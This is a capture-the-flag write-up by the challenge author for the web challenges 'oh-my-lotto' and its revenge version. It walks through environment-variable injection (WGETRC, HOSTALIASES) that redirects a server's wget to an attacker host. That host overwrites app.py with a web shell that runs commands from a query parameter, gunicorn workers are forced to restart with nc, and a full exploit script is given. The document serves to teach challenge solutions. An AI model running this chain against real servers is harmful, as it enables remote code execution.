# web-oh-my-lotto&revenge-EH

## Something

Due to poor consideration, this question may not bring a better experience to you. I'm really sorry. I want to explain something to you. After the first challenge was solved in unintented way, I thought about many ways for the revenge challenge, such as putting `wgetrc` in the blacklist, or locking the attachment with the flag of the first challenge. However, in order not to disclose the solution of the first challenge, I finally chose not to ban the `wgetrc`, but limited the way to obtain the flag, only by rce. But also due to some problems such as permission management, so that the use of `wgetrc` can also solve the revenge challenge. I'm sorry for that, but I did learn a lot from the unintented writeup. Next, I will restore my known unintented and intented solutions, hoping to bring you new knowledge. :)

## Unintented writeup

### oh-my-lotto

* Use `WGETRC` to set `http_proxy` proxy to your own server, download a file like forecast file, and you can get the flag.

* First, get the result of lotto, then upload the result as a forecast, and use `PATH` to let the new `lotto_result.txt` save to other path, so that the lotto result can be equal to the forecast, and get the flag.

### oh-my-lotto-revenge

* Use `WGETRC` to set `http_proxy` and `output_documen`, cover the local wget application, and then use wget to complete RCE.

* Use `WGETRC` to set `http_proxy` and `output_documen`, write SSTI in folder `templates/`, then use SSTI get RCE.

## Intented writeup

According to the attachment, you can set up a website running environment locally, according to the source code `app.py`, when the uploaded `forecast.txt` file content are same as `lotto_result.txt`, you can get the flag. But generate `lotto_result.txt` uses the `secrets` library, which uses a safe random number generation method. Theoretically, there is no risk of being predicted.

It is found that you can run and input an environment variable during lotto guessing, and the environment variable will be passed to `os.system('wget --content-disposition -N lotto')`, but the environment variable will pass through `safe_check` function check.

```
def safe_check(s):
    if 'LD' in s or 'HTTP' in s or 'BASH' in s or 'ENV' in s or 'PROXY' in s or 'PS' in s: 
        return False
    return True
```

Some common methods of using environment variables have been forbidden. By browsing the Linux environment variable document` http://www.scratchbox.org/documentation/general/tutorials/glibcenv.html `In the Network Settings, it is found that `HOSTALIASES` can set the hosts loading file of the shell. The hosts file can  can be uploaded by using the `/forecast` route, and the request sent by `wget --content-disposition -N lotto` to lotto can be forwarded to our own domain name, such as the following hosts file.

```
# hosts
lotto mydomain.com
```

At the same time, it is noted that the parameter `--content-disposition -N` is added to the wget request, indicating that the saved file name of the request will be determined by the file name specified by the service provider, and the original file can be overwritten. Then we can  provide a file download function in our own domain. Set the returned file name to `app.py`, refer to POC

```
from flask import Flask, request, make_response
import mimetypes

app = Flask(__name__)

@app.route("/")
def index():

    r = '''
from flask import Flask,request
import os


app = Flask(__name__)
@app.route("/test", methods=['GET'])
def test():
    a = request.args.get('a')
    a = os.popen(a)
    a = a.read()
    return str(a)

if __name__ == "__main__":
    app.run(debug=True,host='0.0.0.0', port=8080)
'''

    response = make_response(r)
    response.headers['Content-Type'] = 'text/plain'
    response.headers['Content-Disposition'] = 'attachment; filename=app.py'
    return response



if __name__ == "__main__":
    app.run(debug=True,host='0.0.0.0', port=8080)
```

At this time, you will find that the `app.py` has been covered, but it can't directly RCE, because the website uses gunicorn deployment, `app.py` will not be loaded in real time in case of change. However, gunicorn uses a `pre forked worker` mechanism. When a worker times out, gunicorn will restart the worker, and the POC of the worker timeout is as follows


```
# exploit.sh
timeout 50 nc ip 53000 &
timeout 50 nc ip 53000 &
timeout 50 nc ip 53000
```

Final worker reload `app.py`, you can complete RCE and read flag. Refer to the complete POC as follows:

```
# exp.py

import requests
import os
import time
import subprocess

s = requests.session()

base_url = 'http://124.223.208.221:53000/'
url_upload = base_url + 'forecast'
proxies = {
    'http': 'http://127.0.0.1:8080'
}

r = s.post(url=url_upload, proxies=proxies, files={"file":("hosts", open('hosts', 'rb'))})
print(r.text)

url_env = base_url + 'lotto'
data = {
    'lotto_key': 'HOSTALIASES',
    'lotto_value': '/app/guess/forecast.txt'
}
r = s.post(url=url_env, data=data)

subprocess.Popen('./exploit.sh', shell=True)
# os.system('./exploit.sh')
for i in range(1, 53):
    print(i)
    time.sleep(1)

while True:
    url_shell = base_url + 'test?a=env'
    print(url_shell)
    r = s.get(url_shell)
    print(r.text)
    if '*ctf' in r.text:
        print(r.text)
        break
```
